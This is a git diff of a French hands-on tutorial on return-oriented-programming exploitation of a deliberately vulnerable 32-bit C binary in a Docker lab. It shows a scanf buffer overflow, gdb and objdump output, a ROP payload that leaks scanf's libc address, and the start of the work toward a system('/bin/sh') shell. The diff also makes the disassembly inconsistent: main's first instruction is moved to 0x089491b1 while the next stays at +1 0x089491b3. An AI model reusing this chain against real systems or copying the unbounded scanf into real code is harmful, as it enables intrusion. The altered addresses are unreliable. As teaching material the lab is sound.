@@ -19,7 +19,7 @@ Nous avons le code C où nous avons laissez une faille béante.
 
 void input()
 {
-  char buffer[94];
+  char buffer[106];
   printf("Input: \n");
   scanf("%s",buffer);
 }
@@ -29,7 +29,7 @@ int main(int argc, char **argv)
 }
 ```
 
-Dans la fonction input() la fonction scanf() ne vérifie pas si l'entrée de l'input est bien de 94 charactères. Ce qui expose notre programme a une  [BOF](https://fr.wikipedia.org/wiki/D%C3%A9passement_de_tampon).
+Dans la fonction input() la fonction scanf() ne vérifie pas si l'entrée de l'input est bien de 106 charactères. Ce qui expose notre programme a une  [BOF](https://fr.wikipedia.org/wiki/D%C3%A9passement_de_tampon).
 
 Dans le docker vous aurez un binaire à exploiter `rop` dans le répertoire `/root/`. Afin de faire cela vous aurez deux fichier python:
 
@@ -140,7 +140,7 @@ Nous pouvons avoir l'addresse de puts :
 ```
 root@10b97ae13330:~# objdump -d rop | grep "<puts@plt>"
 08849f30 <puts@plt>:
-0884a08e:	e8 9d fe ff ff       	call   8049030 <puts@plt>
+0884a08e:	e8 9d fe ff ff       	call   08849f30 <puts@plt>
 ```
 
 Nous avons donc les addresses de :
@@ -186,7 +186,7 @@ Enfin nous devons trouver l'addresse du main de l'executable. Avec gdb nous pouv
 root@5859be6f9e32:~# gdb rop
 gdb-peda$ disassemble main
 Dump of assembler code for function main:
-   0x089491b3 <+0>:	push   ebp
+   0x089491b1 <+0>:	push   ebp
    0x089491b3 <+1>:	mov    ebp,esp
    0x089491b5 <+3>:	and    esp,0xfffffff0
    0x089491b8 <+6>:	call   0x80491ce <__x86.get_pc_thunk.ax>
@@ -198,10 +198,10 @@ Dump of assembler code for function main:
 End of assembler dump.
 ```
 
-Nous avons donc l'addresse du main: `0x089491b3`.
+Nous avons donc l'addresse du main: `0x089491b1`.
 
 Pour récapituler nous avons :
-* `main` 0x089491b3 
+* `main` 0x089491b1 
 * `puts@plt` 0x08849f30
 * `__isoc99_scanf@GLIBC_2.7` 0x0884cf14
 * Et des gadgets :
@@ -211,7 +211,31 @@ Pour récapituler nous avons :
 Notre premier payload va donc être :
 `payload = addrPLTputs + addrPopEbxRet + addrGOTscanf + addrMain`
 
-Avec toute ça nous pouvons complèter [part1.py](./exercices/part1.py)
+Avec tout ça nous pouvons complèter [part1.py](./exercices/part1.py)
+
+Quand vous le lancez vous devriez avoir une sortie du même style
+```
+root@9e139f0c7ef4:~# python part1.py 
+[*] '/root/rop'
+    Arch:     i386-32-little
+    RELRO:    Partial RELRO
+    Stack:    No canary found
+    NX:       NX enabled
+    PIE:      No PIE (0x8048000)
+[*] '/lib32/libc.so.6'
+    Arch:     i386-32-little
+    RELRO:    Partial RELRO
+    Stack:    Canary found
+    NX:       NX enabled
+    PIE:      PIE enabled
+[+] Starting local process './rop': pid 32
+[*] Construct ropchain
+[*] Get scanf leak
+ 
+\x80���
+Input:
+[*] Stopped process './rop' (pid 32)
+```
 
 ### Création du shell
 
@@ -232,6 +256,9 @@ root@566553ec2fbd:~# objdump -d /lib32/libc.so.6 | grep isoc99_scanf
    7652c:	74 07                	je     65535 <__isoc99_scanf@@GLIBC_2.7+0xb5>
 
 ```
+```
+00076480 <__isoc99_scanf@@GLIBC_2.7>:
+```
 
 Pour trouver l'addresse de `system` dans la libc:
 ```
@@ -240,6 +267,10 @@ root@566553ec2fbd:~# readelf -s /lib32/libc.so.6 | grep system
    658: 000feae0    55 FUNC    GLOBAL DEFAULT   13 __libc_system@@GLIBC_PRIVATE
   1525: 000feae0    55 FUNC    WEAK   DEFAULT   13 system@@GLIBC_2.0
 ```
+```
+1525: 000feae0    55 FUNC    WEAK   DEFAULT   13 system@@GLIBC_2.0
+```
+
 
 Pour trouver l'addresse de la string `/bin/sh` dans la libc:
 ```
